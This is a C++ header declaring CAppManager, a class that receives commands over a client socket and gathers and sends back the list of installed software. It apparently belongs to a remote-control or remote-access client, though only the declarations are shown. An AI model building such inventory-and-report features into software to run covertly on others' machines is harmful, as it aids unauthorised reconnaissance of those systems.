// AppManager.h: interface for the CAppManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_APPMANAGER_H__09A6DC89_2436_4AD4_A2EE_9CA2A45470E3__INCLUDED_)
#define AFX_APPMANAGER_H__09A6DC89_2436_4AD4_A2EE_9CA2A45470E3__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "../Contain/Manager.h"
class CAppManager   : public CManager 
{
public:
	CAppManager(CClientSocket *pClient);
	virtual ~CAppManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);


	LPBYTE getSoftWareList();
	void SendSoftWareList();
};

#endif // !defined(AFX_APPMANAGER_H__09A6DC89_2436_4AD4_A2EE_9CA2A45470E3__INCLUDED_)
